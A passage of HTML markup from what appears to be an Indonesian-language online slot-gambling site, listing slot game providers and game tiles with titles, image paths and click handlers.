                                      <a class="btn-box " href="/slots/booming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BOOMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fachai" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fachai_slot8510.png" data-src="/assets/game_logos/100x70/fachai_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FACHAI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/jdb" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jdb_slot8510.png" data-src="/assets/game_logos/100x70/jdb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JDB</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dragoonsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/dragoon_slot8510.png" data-src="/assets/game_logos/100x70/dragoon_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DRAGOON SOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/apollo777" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/apollo777_slot8510.png" data-src="/assets/game_logos/100x70/apollo777_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">APOLLO777</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/5gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/5gaming_slot8510.png" data-src="/assets/game_logos/100x70/5gaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">5GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ygg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/yggslot8510.png" data-src="/assets/game_logos/100x70/yggslot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">YGG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kagaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kagaming_slot8510.png" data-src="/assets/game_logos/100x70/kagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nagagames" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nagagames_slot8510.png" data-src="/assets/game_logos/100x70/nagagames_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NAGA GAMES</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/live22" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/live22_slot8510.png" data-src="/assets/game_logos/100x70/live22_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LIVE22</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/onegame" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/onegame_slot8510.png" data-src="/assets/game_logos/100x70/onegame_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">One Game</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/bgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/bgaming_slot8510.png" data-src="/assets/game_logos/100x70/bgaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BGAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/gmw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/gmw_slot8510.png" data-src="/assets/game_logos/100x70/gmw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">GMW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/uu" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/uu_slot8510.png" data-src="/assets/game_logos/100x70/uu_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">UU Slot</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/i8" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/i8_slot8510.png" data-src="/assets/game_logos/100x70/i8_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">i8</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/pegasus" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/pegasus_slot8510.png" data-src="/assets/game_logos/100x70/pegasus_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PEGASUS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/btg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/btg_slot8510.png" data-src="/assets/game_logos/100x70/btg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BTG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kingmidas" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kingmaker_slot8510.png" data-src="/assets/game_logos/100x70/kingmaker_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KINGMIDAS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/smartsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/smartsoft_slot8510.png" data-src="/assets/game_logos/100x70/smartsoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SMARTSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/toptrend-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">TOPTREND GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/liteplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/liteplay_slot8510.png" data-src="/assets/game_logos/100x70/liteplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LITEPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/mancalagaming_slot8510.png" data-src="/assets/game_logos/100x70/mancalagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> MANCALA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/eagaming_slot8510.png" data-src="/assets/game_logos/100x70/eagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> EA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/evoplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/evoplay_slot8510.png" data-src="/assets/game_logos/100x70/evoplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">EVOPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/sbo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_slot8510.png" data-src="/assets/game_logos/100x70/sbo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SBO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/568win" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_568win_slot8510.png" data-src="/assets/game_logos/100x70/sbo_568win_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">568 WIN</h5>
              </a>
                           </div>

          
      </div>
    </div>
    <div class="right"><button class="next-btn btn" id="right-button"><i class="icon-keyboard_arrow_right"></i></button></div>


  </div>
</div>


         <div class="row no-gutters filter">
    <div class="col-xs-10 text-center">
      <div class="row">
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="NEW" [ngclass]="{ 'active': filterProperty==FilterType.New  }">BARU</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="TOP" [ngclass]="{ 'active': filterProperty==FilterType.Top  }">TOP</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f active" data-filter="ALL" [ngclass]="{ 'active': filterProperty==FilterType.All  }">SEMUA </button>
        </div>
      </div>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#searchModal"><i class="icon-magnifier"></i></button>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#filterModal-2"><i class="icon-equalizer2"></i></button>
    </div>
  </div>
  <div class="mobile-border"></div>
  <div class="mobile-border"></div>
  <br>
  <input type="hidden" value="pp_slots" name="hiddenGameID-001" id="hiddenGameID-001">
  <div class="row games no-gutters">
          
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune of Olympus" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune of Olympus', '/assets/games/i/165x220/14aaf8e912a234ee841984546d80bcbd.webp?v=0.1' , 'vs20olympgcl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/14aaf8e912a234ee841984546d80bcbd.webp?v=0.1" src="/assets/games/i/165x220/14aaf8e912a234ee841984546d80bcbd.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune of Olympus">Fortune of Olympus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Olympus 1000™" data-filter="ALL,TOP,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Olympus 1000™', '/assets/games/i/165x220/6d39308186b2c0ede30a49d0c486e911.webp?v=0.2' , 'vs20olympx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6d39308186b2c0ede30a49d0c486e911.webp?v=0.2" src="/assets/games/i/165x220/6d39308186b2c0ede30a49d0c486e911.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Olympus 1000™">Gates of Olympus 1000™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Princess 1000" data-filter="ALL,TOP,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Princess 1000', '/assets/games/i/165x220/220106934a3dcdf7fc45d13bf8c3cbe5.webp?v=0.1' , 'vs20starlightx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/220106934a3dcdf7fc45d13bf8c3cbe5.webp?v=0.1" src="/assets/games/i/165x220/220106934a3dcdf7fc45d13bf8c3cbe5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Princess 1000">Starlight Princess 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Olympus Super Scatter" data-filter="ALL,TOP,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Olympus Super Scatter', '/assets/games/i/165x220/12aba443526306c47646afa82d84ba46.webp?v=0.1' , 'vs20olympgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/12aba443526306c47646afa82d84ba46.webp?v=0.1" src="/assets/games/i/165x220/12aba443526306c47646afa82d84ba46.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Olympus Super Scatter">Gates of Olympus Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Wins 3 - Black Scatter" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Wins 3 - Black Scatter', '/assets/games/i/165x220/b918217637bd8887a37f2f0221bf4609.webp?v=0.4' , 'vswaysmahwblck', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b918217637bd8887a37f2f0221bf4609.webp?v=0.4" src="/assets/games/i/165x220/b918217637bd8887a37f2f0221bf4609.webp?v=0.4" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Wins 3 - Black Scatter">Mahjong Wins 3 - Black Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Rush Super Scatter" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Rush Super Scatter', '/assets/games/i/165x220/4f625f116ff914b398d6a98dad047d08.webp?v=0.1' , 'vs20sugrushss', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4f625f116ff914b398d6a98dad047d08.webp?v=0.1" src="/assets/games/i/165x220/4f625f116ff914b398d6a98dad047d08.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Rush Super Scatter">Sugar Rush Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Kadita Ocean Fury" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Kadita Ocean Fury', '/assets/games/i/165x220/a9030c59c5055308e8c23c2eafae0617.webp?v=0.2' , 'vs20kaditafury', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a9030c59c5055308e8c23c2eafae0617.webp?v=0.2" src="/assets/games/i/165x220/a9030c59c5055308e8c23c2eafae0617.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Kadita Ocean Fury">Kadita Ocean Fury</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza 1000" data-filter="ALL,TOP,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza 1000', '/assets/games/i/165x220/68585ca56ca4bd96989c71fce118b8b6.webp?v=0.1' , 'vs20fruitswx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/68585ca56ca4bd96989c71fce118b8b6.webp?v=0.1" src="/assets/games/i/165x220/68585ca56ca4bd96989c71fce118b8b6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza 1000">Sweet Bonanza 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Olympus™" data-filter="ALL,BUY BONUS FEATURE,TOP,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Olympus™', '/assets/games/i/165x220/4d5007c76503d49d8ef3f96d3cf4a01c.webp?v=0.1' , 'vs20olympgate', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4d5007c76503d49d8ef3f96d3cf4a01c.webp?v=0.1" src="/assets/games/i/165x220/4d5007c76503d49d8ef3f96d3cf4a01c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Olympus™">Gates of Olympus™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wisdom of Athena 1000 Xmas" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wisdom of Athena 1000 Xmas', '/assets/games/i/165x220/d0d8073c39cee1f4441fa726056bb7fb.webp?v=0.1' , 'vs20procountxm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d0d8073c39cee1f4441fa726056bb7fb.webp?v=0.1" src="/assets/games/i/165x220/d0d8073c39cee1f4441fa726056bb7fb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wisdom of Athena 1000 Xmas">Wisdom of Athena 1000 Xmas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong wins 2" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong wins 2', '/assets/games/i/165x220/eb0608f4ba7bebd39e1cfbf0cbac104a.webp?v=0.2' , 'vswaysmahwin2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/eb0608f4ba7bebd39e1cfbf0cbac104a.webp?v=0.2" src="/assets/games/i/165x220/eb0608f4ba7bebd39e1cfbf0cbac104a.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong wins 2">Mahjong wins 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Gatot Kaca 1000" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Gatot Kaca 1000', '/assets/games/i/165x220/7f15c55590fe6e9f020081f140226bba.webp?v=0.1' , 'vs20gatotx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7f15c55590fe6e9f020081f140226bba.webp?v=0.1" src="/assets/games/i/165x220/7f15c55590fe6e9f020081f140226bba.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Gatot Kaca 1000">Gates of Gatot Kaca 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Archer 1000" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Archer 1000', '/assets/games/i/165x220/46cc618c68dd2ba16576543c04d5ff5e.webp?v=0.1' , 'vs20stararx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/46cc618c68dd2ba16576543c04d5ff5e.webp?v=0.1" src="/assets/games/i/165x220/46cc618c68dd2ba16576543c04d5ff5e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Archer 1000">Starlight Archer 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Princess Super Scatter" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Princess Super Scatter', '/assets/games/i/165x220/b289bcd54748e0cdfdae37dba5663a3e.webp?v=0.1' , 'vs20starprss', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b289bcd54748e0cdfdae37dba5663a3e.webp?v=0.1" src="/assets/games/i/165x220/b289bcd54748e0cdfdae37dba5663a3e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Princess Super Scatter">Starlight Princess Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Rush 1000" data-filter="ALL,TOP,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Rush 1000', '/assets/games/i/165x220/56200a76037dde7e0576d54b43ef82d0.webp?v=0.1' , 'vs20sugarrushx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/56200a76037dde7e0576d54b43ef82d0.webp?v=0.1" src="/assets/games/i/165x220/56200a76037dde7e0576d54b43ef82d0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Rush 1000">Sugar Rush 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza" data-filter="ALL,BUY BONUS FEATURE,TOP,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza', '/assets/games/i/165x220/cf7fdad8713f88703071adaf9a189b74.webp?v=0.1' , 'vs20fruitsw', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cf7fdad8713f88703071adaf9a189b74.webp?v=0.1" src="/assets/games/i/165x220/cf7fdad8713f88703071adaf9a189b74.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza">Sweet Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza Super Scatter" data-filter="ALL,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza Super Scatter', '/assets/games/i/165x220/4d0bee6b7bdc8bdce588ae234d1c6272.webp?v=0.1' , 'vs20swbonsup', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4d0bee6b7bdc8bdce588ae234d1c6272.webp?v=0.1" src="/assets/games/i/165x220/4d0bee6b7bdc8bdce588ae234d1c6272.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza Super Scatter">Sweet Bonanza Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wisdom of Athena 1000" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wisdom of Athena 1000', '/assets/games/i/165x220/bdf82e6b017c2d90f2a5cdbdbab583ad.webp?v=0.1' , 'vs20procountx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bdf82e6b017c2d90f2a5cdbdbab583ad.webp?v=0.1" src="/assets/games/i/165x220/bdf82e6b017c2d90f2a5cdbdbab583ad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wisdom of Athena 1000">Wisdom of Athena 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Gatot Kaca Super Scatter" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Gatot Kaca Super Scatter', '/assets/games/i/165x220/c661bc975c3baed65dd9c26ecc64e456.webp?v=0.1' , 'vs20olgatssc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c661bc975c3baed65dd9c26ecc64e456.webp?v=0.1" src="/assets/games/i/165x220/c661bc975c3baed65dd9c26ecc64e456.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Gatot Kaca Super Scatter">Gates of Gatot Kaca Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Rush Bonanza" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Rush Bonanza', '/assets/games/i/165x220/77c28568e6f642ce8ae240719d3f4e2b.webp?v=0.1' , 'vs20swrbon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/77c28568e6f642ce8ae240719d3f4e2b.webp?v=0.1" src="/assets/games/i/165x220/77c28568e6f642ce8ae240719d3f4e2b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Rush Bonanza">Sweet Rush Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mummy’s Jewels 100" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mummy’s Jewels 100', '/assets/games/i/165x220/f7732ed21fa810627131e1a48fcd1bcc.webp?v=0.1' , 'vswaysmjwl2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f7732ed21fa810627131e1a48fcd1bcc.webp?v=0.1" src="/assets/games/i/165x220/f7732ed21fa810627131e1a48fcd1bcc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mummy’s Jewels 100">Mummy’s Jewels 100</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Treasures of Osiris" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Treasures of Osiris', '/assets/games/i/165x220/48ecef86c8130ce74dfea084d10c1e9f.webp?v=0.1' , 'vs25tripleps', '' )" style="">

          <div class="content-wrapper">
              
